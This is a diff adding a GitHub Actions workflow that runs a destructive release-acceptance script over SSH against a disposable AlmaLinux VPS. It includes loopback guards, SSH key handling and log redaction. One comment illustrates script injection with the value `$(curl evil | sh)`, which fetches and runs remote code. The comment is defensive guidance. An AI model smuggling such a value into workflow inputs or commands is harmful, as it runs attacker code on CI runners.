@@ -1,0 +1,160 @@
+name: VPS release acceptance
+
+# Manual-only wrapper around deploy/almalinux/lifecycle-acceptance.sh —
+# the release candidate acceptance gate this repository already has.
+# This workflow does NOT provision or destroy a disposable VPS itself:
+# doing that unattended requires real cloud-provider credentials and a
+# specific provider's API, neither of which exists in the environment
+# this workflow was authored in, and shipping untested provisioning
+# code (picking a provider, guessing at its API shape) would be worse
+# than no automation at all. Bring your own disposable AlmaLinux 9
+# x86_64 host (any cloud VM, or an ephemeral self-hosted Actions
+# runner registered on one) and destroy it yourself once this run
+# completes.
+#
+# Required secrets (repository or environment scoped):
+#   VPS_ACCEPTANCE_SSH_KEY   private key for the target host's root/sudo user
+# Optional secrets:
+#   VPS_ACCEPTANCE_PRODUCTION_HOST   hostname/IP this workflow must refuse to
+#                                    target (belt-and-suspenders alongside the
+#                                    script's own /etc/vpn/deployment.toml
+#                                    check, which only helps when run FROM the
+#                                    production host itself).
+#
+# This workflow WIPES singbox-vpn state on whatever host you point it at.
+# Never target a real deployment.
+#
+# Every ${{ inputs.* }}/${{ secrets.* }} value is passed through `env:`
+# and read as a normal shell variable ($FOO), never interpolated
+# directly into a `run:` script body — GitHub substitutes `${{ }}`
+# expressions as raw text before the shell ever sees the script, so
+# interpolating an attacker-influenced input directly is a script-
+# injection vector (a value like `$(curl evil | sh)` or a trailing
+# backtick would be spliced in verbatim). `workflow_dispatch` already
+# requires repository write access to trigger, but there is no reason
+# to rely on that alone when routing through `env:` costs nothing.
+
+on:
+  workflow_dispatch:
+    inputs:
+      ssh_host:
+        description: "user@host of the disposable AlmaLinux 9 x86_64 target (never localhost or a production host)"
+        required: true
+      ssh_port:
+        description: "SSH port"
+        required: false
+        default: "22"
+      version:
+        description: "Immutable release tag to test (e.g. v0.1.4-rc.1). Leave empty to test the current branch as an explicitly UNVERIFIED development-channel run instead of a production-acceptance result."
+        required: false
+        default: ""
+      update_to_version:
+        description: "Optional second release tag to exercise update.sh + rollback against"
+        required: false
+        default: ""
+      skip_reboot:
+        description: "Skip the reboot+health stage"
+        required: false
+        default: false
+        type: boolean
+
+permissions:
+  contents: read
+
+jobs:
+  guard:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Refuse an obviously local/loopback target
+        env:
+          SSH_HOST: ${{ inputs.ssh_host }}
+        run: |
+          set -euo pipefail
+          host_part="${SSH_HOST#*@}"
+          case "$host_part" in
+            localhost|127.0.0.1|0.0.0.0|::1|"")
+              echo "::error::refusing to target '$host_part' — this workflow is SSH-only and must never run against the runner itself. lifecycle-acceptance.sh enforces this same rule again below." >&2
+              exit 1 ;;
+          esac
+          echo "ok: ssh_host is not an obvious loopback address (lifecycle-acceptance.sh performs the authoritative check)"
+
+  acceptance:
+    needs: guard
+    runs-on: ubuntu-latest
+    # The full destructive lifecycle (install, reboot, watchdog recovery,
+    # update+rollback, backup/restore, uninstall/reinstall) genuinely takes
+    # a while against a real host.
+    timeout-minutes: 90
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+
+      - name: Confirm required secret is configured
+        env:
+          SSH_KEY: ${{ secrets.VPS_ACCEPTANCE_SSH_KEY }}
+        run: |
+          set -euo pipefail
+          if [ -z "$SSH_KEY" ]; then
+            echo "::error::VPS_ACCEPTANCE_SSH_KEY secret is not configured for this repository/environment. Add the disposable target's SSH private key as a secret before running this workflow." >&2
+            exit 1
+          fi
+          echo "ok: VPS_ACCEPTANCE_SSH_KEY is configured"
+
+      - name: Set up SSH key
+        env:
+          SSH_KEY: ${{ secrets.VPS_ACCEPTANCE_SSH_KEY }}
+        run: |
+          set -euo pipefail
+          install -d -m 0700 ~/.ssh
+          umask 077
+          printf '%s\n' "$SSH_KEY" > ~/.ssh/vps_acceptance_key
+          chmod 600 ~/.ssh/vps_acceptance_key
+          eval "$(ssh-agent -s)" >> "$GITHUB_ENV"
+          ssh-add ~/.ssh/vps_acceptance_key
+
+      - name: Run the destructive lifecycle acceptance gate
+        env:
+          SINGBOX_VPN_PRODUCTION_HOST: ${{ secrets.VPS_ACCEPTANCE_PRODUCTION_HOST }}
+          SSH_HOST: ${{ inputs.ssh_host }}
+          SSH_PORT: ${{ inputs.ssh_port }}
+          RELEASE_VERSION: ${{ inputs.version }}
+          UPDATE_TO_VERSION: ${{ inputs.update_to_version }}
+          SKIP_REBOOT: ${{ inputs.skip_reboot }}
+        run: |
+          set -euo pipefail
+          args=(--host "$SSH_HOST" --i-understand-this-is-destructive --ssh-port "$SSH_PORT")
+          if [ -n "$RELEASE_VERSION" ]; then
+            args+=(--version "$RELEASE_VERSION")
+          fi
+          if [ -n "$UPDATE_TO_VERSION" ]; then
+            args+=(--update-to-version "$UPDATE_TO_VERSION")
+          fi
+          if [ "$SKIP_REBOOT" = "true" ]; then
+            args+=(--skip-reboot)
+          fi
+          echo "running: deploy/almalinux/lifecycle-acceptance.sh ${args[*]/--i-understand-this-is-destructive/[ack]}"
+          bash deploy/almalinux/lifecycle-acceptance.sh "${args[@]}" 2>&1 | tee lifecycle-acceptance.log
+
+      - name: Defensive scrub before upload (belt-and-suspenders; the harness itself never prints secrets)
+        if: always()
+        run: |
+          set -euo pipefail
+          if [ -f lifecycle-acceptance.log ]; then
+            # Redact anything that looks like a token/password/key value
+            # (word=VALUE, VALUE 12+ chars of base64/hex-ish content) as a
+            # second layer of defense on top of the harness's own design.
+            sed -E 's/((token|password|secret|private_key)[[:space:]]*[:=][[:space:]]*)[A-Za-z0-9+\/_=.-]{12,}/\1[REDACTED]/gi' \
+              lifecycle-acceptance.log > lifecycle-acceptance.sanitized.log
+          fi
+
+      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        if: always()
+        with:
+          name: vps-acceptance-log
+          path: lifecycle-acceptance.sanitized.log
+          if-no-files-found: warn
+          retention-days: 30
+
+      - name: Remove the SSH key regardless of outcome
+        if: always()
+        run: rm -f ~/.ssh/vps_acceptance_key
